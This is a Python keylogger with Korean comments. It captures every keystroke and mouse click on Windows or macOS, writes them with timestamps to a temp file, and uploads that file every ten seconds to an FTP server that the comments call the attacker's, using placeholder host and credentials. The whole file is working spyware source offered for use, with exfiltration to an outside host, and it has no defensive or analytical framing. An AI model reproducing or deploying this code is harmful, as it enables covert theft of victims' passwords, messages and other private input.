import ftplib
import time
import os
import platform
from datetime import datetime
from pynput import keyboard, mouse

# FTP 서버 로그인 정보 정의
FTP_HOST = 'your_ftp_ip'  # 공격자 IP 
FTP_USER = 'your_ftp_user'  # 공격자 ftp 서버 사용자 아이디 
FTP_PASS = 'your_ftp_pwd'  # 공격자 ftp 서버 사용자 비밀번호 

# 운영 체제에 따라 로그 파일 경로 정의
if platform.system() == 'Windows': # Windows
    log_file_path = os.path.join(os.getenv('TEMP'), 'key_logs.txt')
elif platform.system() == 'Darwin':  # MacOS
    log_file_path = os.path.join('/tmp', 'key_logs.txt')
else:
    raise Exception('Unsupported OS')

# 파일이 존재하지 않으면 빈 파일 생성
if not os.path.exists(log_file_path):
    with open(log_file_path, 'w') as f:
        f.write('')

# FTP 서버에 파일 업로드
def upload_to_ftp(log_file_path, remote_file_path):
    try:
        session = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
        with open(log_file_path, 'rb') as f:
            session.storbinary(f'STOR {remote_file_path}', f)
        session.quit()
    except Exception as e:
        print(f'Error uploading file to FTP server: {e}')

# 키보드 입력 및 마우스 클릭 캡쳐
def on_press(key):
    with open(log_file_path, 'a') as f:
        current_time = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
        f.write(f'{current_time} Key pressed: {key}\n')

def on_click(x, y, button, pressed):
    with open(log_file_path, 'a') as f:
        current_time = datetime.now().strftime('[%Y-%m-%d %H:%M:%S]')
        if pressed:
            f.write(f'{current_time} Mouse clicked at ({x}, {y}) with {button} button pressed\n')
        else:
            f.write(f'{current_time} Mouse released at ({x}, {y}) with {button} button released\n')

# 키보드 입력 리스너
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# 마우스 클릭 리스너
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# 10초 마다 FTP 서버에 파일 업로드
while True:
    try:
        remote_file_path = 'key_logs.txt'  # FTP 서버에 업로드 될 경로
        upload_to_ftp(log_file_path, remote_file_path)  # FTP 서버에 파일 업로드
        print('File uploaded to FTP server.')
    except Exception as e:
        print(f'Error uploading file to FTP server: {e}')
    time.sleep(10)
